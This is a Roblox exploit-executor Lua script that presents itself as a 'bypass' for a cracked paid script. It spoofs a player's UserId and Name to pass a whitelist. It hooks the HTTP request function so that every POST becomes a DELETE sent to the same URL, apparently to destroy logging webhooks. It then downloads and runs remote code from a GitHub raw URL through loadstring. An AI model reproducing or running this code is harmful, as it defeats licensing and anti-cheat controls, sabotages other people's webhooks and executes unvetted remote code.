local ActualHost = getgenv().RealHost
local OldName = game.Players.LocalPlayer.Name
coroutine.wrap(function()
	if game.Players:FindFirstChild(ActualHost) then
		game.Players:FindFirstChild(ActualHost).UserId = 1815481733
		game.Players:FindFirstChild(ActualHost).Name = "luvrserenity"
	end
	if workspace.Players:FindFirstChild(ActualHost) then
		workspace.Players:FindFirstChild(ActualHost).Name = "luvrserenity"
	end
end)()
getgenv().Settings["host"] = 1815481733 -- ignore part of the bypass

local synapse, shithttp = syn and syn.request, http and http.request
local request = http_request or request or HttpPost or synapse or shithttp
local webhookdetect
webhookdetect = hookfunction(request, function(self)
	if self.Method and self.Method == "POST" and self.Url then
		local abcdef = { Url = self.Url, Method = "DELETE" }
		request(abcdef)
		return true
	end
	return webhookdetect(self)
end)

wait(0.5)
if OldName ~= ActualHost then
	print("Let")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/CrackedIKU/main/CrackedIKU"))()
end
print("Worked2")
